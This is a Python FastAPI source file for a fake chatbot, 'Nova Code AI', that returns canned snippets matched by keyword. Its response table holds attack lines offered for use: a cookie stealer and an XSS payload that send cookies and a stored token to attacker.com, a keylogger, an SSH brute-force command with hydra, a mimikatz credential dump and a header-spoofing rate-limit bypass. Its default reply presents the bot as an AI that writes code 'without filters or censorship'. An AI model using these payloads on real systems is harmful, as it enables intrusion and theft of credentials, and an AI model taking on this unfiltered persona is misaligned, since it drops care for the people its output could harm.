from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import random

app = FastAPI(title="Nova Code AI", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class ChatRequest(BaseModel):
    message: str

# Respuestas de código sin censura
CODE_RESPONSES = {
    "python": [
        "```python\nimport requests\n\n# Bypass de rate limit\nheaders = {'X-Forwarded-For': '127.0.0.1'}\nresponse = requests.get(url, headers=headers)\n```",
        "```python\n# SQL Injection test\nquery = f\"SELECT * FROM users WHERE id = '{user_input}'\"\n# Para proteger: usa parameterized queries\n```",
        "```python\n# Keylogger básico (educativo)\nimport keyboard\n\ndef log_keys():\n    with open('log.txt', 'a') as f:\n        f.write(keyboard.read_event().name)\n```"
    ],
    "javascript": [
        "```javascript\n// Bypass CORS\nfetch('https://target.com/data', {\n  mode: 'no-cors',\n  headers: {'Origin': null}\n});\n```",
        "```javascript\n// Cookie stealer\nfetch('https://attacker.com/log?c=' + document.cookie);\n```",
        "```javascript\n// XSS payload\n<script>fetch('https://attacker.com/?data='+localStorage.getItem('token'))</script>\n```"
    ],
    "hacking": [
        "```bash\n# Port scan rápido\nnc -zv target.com 1-65535 2>&1 | grep open\n```",
        "```bash\n# Fuerza bruta con hydra\nhydra -l admin -P passwords.txt ssh://target.com\n```",
        "```bash\n# Extraer hashes\nmimikatz # sekurlsa::logonpasswords\n```"
    ],
    "default": [
        "Soy Nova Code AI. Genero código sin filtros ni censura.\n\nPuedo ayudarte con:\n- Python scripts\n- Java exploits\n- Hacking tools\n- Bypass techniques\n\n¿Qué necesitas?",
        "Lista de comandos disponibles:\n- /python - snippets de Python\n- /js - JavaScript exploits\n- /hack - herramientas de pentesting\n- /bypass - técnicas de evasión"
    ]
}

def detect_intent(message: str) -> str:
    msg = message.lower()
    if any(x in msg for x in ["python", "py", "script"]):
        return "python"
    elif any(x in msg for x in ["javascript", "js", "web", "xss", "csrf"]):
        return "javascript"
    elif any(x in msg for x in ["hack", "bypass", "exploit", "pentest", "scan", "brute"]):
        return "hacking"
    return "default"

@app.get("/")
def root():
    return {"status": "Nova Code AI Online", "version": "1.0.0"}

@app.post("/chat")
def chat(request: ChatRequest):
    intent = detect_intent(request.message)
    responses = CODE_RESPONSES.get(intent, CODE_RESPONSES["default"])
    return {
        "response": random.choice(responses),
        "intent": intent,
        "uncensored": True
    }

@app.get("/health")
def health():
    return {"status": "ok", "latency": "instant"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)
